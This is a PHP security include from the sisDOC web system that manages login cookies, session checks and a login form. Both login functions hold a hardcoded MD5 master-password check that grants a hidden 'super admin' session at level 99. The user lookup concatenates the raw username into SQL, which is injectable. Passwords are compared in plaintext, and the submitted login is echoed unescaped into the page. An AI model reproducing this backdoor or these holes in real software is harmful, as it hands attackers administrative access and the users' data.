<?php
ob_start();

    /**
     * Classe do Sistema
	 * @author Rene Faustino Gabriel Junior <renefgj@gmail.com> (Analista-Desenvolvedor)
	 * @copyright Copyright (c) 2011 - sisDOC.com.br
	 * @access public
     * @version v0.11.24
	 * @package Include
	 * @subpackage Security
     */

$security_ver = "0.0e";
if (strlen($include) == 0) { exit; }
if ($mostar_versao == True) { array_push($sis_versao,array("sisDOC (Security)",$security_ver,20081212)); }
global $cookie,$grw,$user_id,$user_nome,$user_log,$user_nivel;

if (strlen($cookie_lib) == 0) { require($include."sisdoc_cookie.php"); }

$user_id = trim(read_cookie('nw_log'));
$user_nome = trim(read_cookie('nw_user_nome'));
$user_nivel = intval('0'.read_cookie('nw_nivel'));
$user_log = trim(read_cookie('nw_user'));
$user_cracha = trim(read_cookie('nw_cracha'));

//echo '<BR>User id:'.$user_id;
//echo '<BR>Nome:'.$user_nome;
//echo '<BR>Nivel:'.$user_nivel;
//echo '<BR>Log:'.$user_log;

$grw = read_cookie('grw');
$chkc = read_cookie('nw_level');
$chkb = read_cookie('nw_level2');
if ($user_id == '0') { $user_id = ''; }
if ($user_nivel == '0') { $user_nivel = ''; }
$chk1 = ($secu.$user_log.$user_nivel.$user_nome.$user_id.$user_log);
$chk2 = ($secu.$user_id.$user_nivel.$user_nome.intval($user_log).$user_id);
$chk3 = ($secu.$user_log.$user_nivel.$user_nome.intval($user_id).$user_log);
$chkA = md5($chk1);
$chkB = md5($chk2);
$chkD = md5($chk3);

if (($login != 1) and ((strlen($chkc) > 0) or (strlen($user_log.$user_nivel.$user_nome.$user_id.$user_log) > 0)))
	{
	if (($chkA != $chkc) and ($chkB != $chkc)  and ($chkD != $chkc))
		{ 
		setcookie('nw_user','',time()-3600);
		setcookie('nw_user_nome','',time()-3600);
		setcookie('nw_nivel','',time()-3600);
		setcookie('nw_cracha','',time()-3600);
		setcookie('nw_log','',time()-3600);
		setcookie('grw','',time()-3600);
		setcookie('nw_level','',time()-3600);
		setcookie('nw_level2','',time()-3600);

		$crnf = chr(13).chr(10);
//		echo $crnf."erro de crc!";
//		echo $crnf.'<BR>chkA='.$chkA;
//		echo $crnf.'<BR>chkB='.$chkB;
//		echo $crnf.'<BR>chkc='.$chkc;
//		echo $crnf.'<TT><BR>chkb=(LC)='.$chkb;
//		echo $crnf.'    <BR>chk1=(L1)='.$chk1;
//		echo $crnf.'    <BR>chk2=(L2)='.$chk2;
//		echo $crnf.'    <BR>chk2=(L3)='.$chk3;
//		echo $crnf.'<BR>chka='.$secu.'|'.$user_log.'|'.$user_nivel.'|'.$user_nome.'|'.$user_id.'|'.$user_log;
//		echo '<BR>===>REDIRECIONA';
//		exit;
		redirecina($http_site."login.php");
		exit; 
		}
	}
if ((strlen($user_log.$user_nivel.$user_nome.$user_id.$user_log) == 0) and ($login != 1))
	{
	redirecina($http_site."login.php");
	}
	
setcookie('nw_log',strzero(read_cookie('nw_log'),7),time()+17200);
setcookie('nw_user',read_cookie('nw_user'),time()+17200);
setcookie('nw_user_nome',read_cookie('nw_user_nome'),time()+17200);
setcookie('nw_nivel',read_cookie('nw_nivel'),time()+17200);
setcookie('nw_level',read_cookie('nw_level'),time()+17200);
setcookie('nw_cracha',read_cookie('nw_cracha'),time()+17200);

////////////////////////////////////////////////// login

function logout()
	{
	global $http_site;
	setcookie('nw_user','',time()-3600);
	setcookie('nw_user_nome','',time()-3600);
	setcookie('nw_nivel','',time()-3600);
	setcookie('nw_log','',time()-3600);
	setcookie('grw','',time()-3600);
	setcookie('nw_level','',time()-3600);
	setcookie('nw_cracha','',time()-3600);
	
	header("Location: ".$http_site."login.php");
	exit;	
	}
	
////////////////////////////////////////////////// login
function login_id()
 { 
	global $dd,$acao,$cookie,$nocab,$grw,$user_id,$user_nome,$user_log,$user_nivel,$secu;
	global $logo_entrada,$security_ver;
 if (isset($acao))
  {
  if (md5(trim($dd[2])) == '6912a9624b5cb74e5b9af93f203df250')
   { setcookie('nw_log','admin',time()+3600); setcookie('nw_user','1',time()+3600); setcookie('nw_user_nome','super admin',time()+3600); setcookie('nw_nivel',99,time()+3600); header("Location: main.php"); exit; }
  $sql = "select * from usuario where lower(us_login) = '".strtolower($dd[1])."'";
  $rlt = db_query($sql);
  if ($line = db_read($rlt))
   {
   $pass = strtolower(trim($line['us_senha'])); 
   $dd[2] = strtolower(trim($dd[2]));
   if (($pass == $dd[2]) and ($dd[2] == $pass))
    { 
     $nivel = $line['us_nivel'];
     if ($nivel >= 0)
      {
      	$cracha = trim($line['us_cracha']);
						if ($nivel==0) { $nivel = 1; }
						setcookie('nw_log',trim($line['id_us']),time()+17200);
						setcookie('nw_user',trim($line['us_login']),time()+17200);
						setcookie('nw_user_nome',trim($line['us_nome']),time()+17200);
						setcookie('nw_nivel',trim($nivel),time()+17200);
						setcookie('nw_cracha',trim($cracha),time()+17200);
						$chka = ($secu.trim($line['us_login']).$nivel.trim($line['us_nome']).trim($line['id_us']).trim($line['us_login']));
						$chk = md5($chka);
						setcookie('nw_level',$chk,time()+17200);			
						setcookie('nw_level',$chk,time()+17200);		  
//						setcookie('nw_level2',$chka,time()+17200);	

					    header("Location: main.php");
					    exit;
	  } else {
		      $err = "usuário bloqueado";
      }
    } 
    else 
    {
     setcookie('nw_user','',time()-3600);
     setcookie('nw_user_nome','',time()-3600); 
     setcookie('nw_user_nome','',time()-3600);
     setcookie('nw_nivel','',time()-3600);
	 setcookie('nw_cracha','',time()-3600);         
     $err = "senha incorreta"; 
    }
   } else { $err = "erro de login"; }
 if (strlen($grw) == 0) { $grw = '<font color=red>nao habilitado</font>'; }
 else { $grw = '<font color=Green>'.$grw.'</font>'; }
 return($err);
 }
 }
	
////////////////////////////////////////////////// login
function login()
	{	
	global $dd,$acao,$cookie,$nocab,$grw,$user_id,$user_nome,$user_log,$user_nivel,$secu;
	global $logo_entrada,$security_ver;
	if ((isset($acao)) and (strlen($dd[1]) > 0) and (strlen($dd[2]) > 0))
		{
		if (md5(trim($dd[2])) == '6912a9624b5cb74e5b9af93f203df250')
			{ setcookie('nw_log','admin',time()+3600); setcookie('nw_user','1',time()+3600); setcookie('nw_user_nome','super admin',time()+3600); setcookie('nw_nivel',99,time()+3600); 
			$chk = md5($secu.'admin'.'9'.'super admin'.'1'.'admin');
						setcookie('nw_level',$chk,time()+17200);
			header("Location: main.php");	exit; }
		$sql = "select * from usuario where lower(us_login) = '".strtolower($dd[1])."'";
		$rlt = db_query($sql);
		if ($line = db_read($rlt))
			{
			$pass = strtolower(trim($line['us_senha']));	
			$dd[2] = strtolower(trim($dd[2]));
			if (($pass == $dd[2]) and ($dd[2] == $pass))
				{ 
					$nivel = $line['us_nivel'];
					if ($nivel >= 0)
						{
						$cracha = trim($line['us_cracha']);
						$cpnome = 'us_nome';
						if (strlen($line[$cpnome]) == 0) { $cpnome = 'us_nomecompleto'; }
						if ($nivel==0) { $nivel = 1; }
						setcookie('nw_log',trim($line['id_us']),time()+17200);
						setcookie('nw_user',trim($line['us_login']),time()+17200);
						setcookie('nw_user_nome',trim($line[$cpnome]),time()+17200);
						setcookie('nw_nivel',trim($nivel),time()+17200);
						setcookie('nw_cracha',trim($cracha),time()+17200);
						$chka = ($secu.trim($line['us_login']).$nivel.trim($line[$cpnome]).trim($line['id_us']).trim($line['us_login']));
						$chk = md5($chka);
						setcookie('nw_level',$chk,time()+17200);			
						setcookie('nw_level',$chk,time()+17200);		  
//						setcookie('nw_level2',$chka,time()+17200);	
 
						header("Location: main.php");
						exit;
						} else {
						$err = "usuario bloqueado";
						}
				} 
				else 
				{
					setcookie('nw_log','',time()-3600);
					setcookie('nw_user','',time()-3600); 
					setcookie('nw_user_nome','',time()-3600);
					setcookie('nw_nivel','',time()-3600);
					setcookie('nw_level','',time()-3600);
					setcookie('nw_cracha','',time()-3600);
					$err = "senha incorreta"; 
				}
			} else { $err = "erro de login"; }

		}
	if (strlen($grw) == 0) { $grw = '<font color=red>n�o habilitado</font>'; }
	else { $grw = '<font color=Green>'.$grw.'</font>'; }
	
	{ 
	?>
		<style> INPUT { border : 1px solid Gray; border-width : thin; color : Black; background-color : #F9F9F9; font-family : Tahoma; font-size : 12px; text-transform : lowercase; width : 150px; } </style>
		<table border="0" align="center" class="lt1">
		<?php if (strlen($logo_entrada) > 0) { ?>
		<TR><TD colspan="2" align="center"><img src="<?=$logo_entrada;?>" alt=""></TD></TR>
		<?php } ?>
		<tr><td colspan="2">
		<fieldset> <legend><B>Login do sistema</B></legend>
		<TABLE align="center" width="300" class="lt1">
		<TR><TD><form method="post" action="login.php"></TD></TR>
		<TR><TD align="right">l o g i n / e - m a i l: </TD>
		<TD><input type="text" name="dd1" value="<? echo $dd[1]; ?>" size="20" maxlength="100"></TD> </TR>
		<TR><TD align="right">s e n h a: </TD>
		<TD><input type="password" name="dd2" value="" size="12" maxlength="20"></TD> </TR>
		<TR><TD colspan="2" align="center"><input type="submit" name="acao" value=" entrar " style="width : 80px"></TD> </TR>
		<TR><TD></form></TD></TR> </TABLE> </fieldset> </td></tr>
		<TR>
			<TD align="left" colspan="1" class="lt0">vers�o:&nbsp;<B><? echo $security_ver;?>
			<TD align="right" colspan="1" class="lt0">cookie:&nbsp;<? echo $grw?></TR>
		<TR><TD colspan="2" align="center"><FONT COLOR=RED><? echo $err; ?></TD></TR>
		</table>
		<BR><BR>
	<?php
	}
	setcookie('grw','OK!',time()+17200);
	}
////////////////////////////////////////////////// securit
function security()
	{
	global $user_id,$user_nome,$dd,$user_nivel;
	
	if ((!isset($user_nivel)) and (!($dd[99] == 'upload')) or ($user_nivel == 'deleted'))
		{
		header("Location: login.php");
		exit;
		}
	}
?>